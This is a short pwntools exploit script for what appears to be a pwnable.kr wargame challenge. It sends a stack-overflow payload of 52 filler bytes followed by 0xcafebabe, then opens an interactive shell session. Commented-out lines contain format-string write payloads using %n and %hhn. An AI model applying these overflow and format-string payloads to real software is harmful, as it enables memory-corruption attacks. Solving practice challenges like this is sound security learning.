#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack
from sys import *


# count = 0
conn = remote("pwnable.kr", 9000)
# conn = process('./format1_32')


# Welcome message
# front_line = conn.recvuntil("\n")


# payload = "A"+ p32(addr) + "%13$0251c" + "%7$hhn"
payload =   b'\x11\x11\x11\x11'*13+b'\xbe\xba\xfe\xca'

# payload = "B" + p32(addr) + "%08x.%08x.%08x.%08x.%08x.%n"
print len(payload)

log.info('Sending payload:' + payload)
conn.sendline(payload)
conn.interactive()
print conn.recvall()
conn.close()
